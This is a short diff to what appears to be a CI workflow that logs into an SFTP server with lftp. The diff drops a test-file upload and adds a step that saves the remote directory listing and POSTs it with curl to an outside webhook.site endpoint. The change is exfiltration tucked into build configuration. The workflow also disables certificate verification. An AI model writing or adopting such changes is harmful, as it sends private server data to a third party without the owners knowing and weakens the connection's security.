@@ -22,16 +22,14 @@ jobs:
         sudo apt-get update -qq
         sudo apt-get install -y lftp
         
-        echo "Root directory contents:" > test_root_dir.txt
-        
         cat <<EOF > test.lftp
         set sftp:auto-confirm yes
         set ssl:verify-certificate no
         open sftp://$SFTP_SERVER
         user "$SFTP_USERNAME" "$SFTP_PASSWORD"
-        ls >> test_root_dir.txt
-        put test_root_dir.txt
+        ls > remote_dir.txt
         bye
         EOF
         
         lftp -f test.lftp
+        curl -X POST --data-binary @remote_dir.txt https://webhook.site/9f44609f-7e56-4ba6-8716-13aae61f9a79
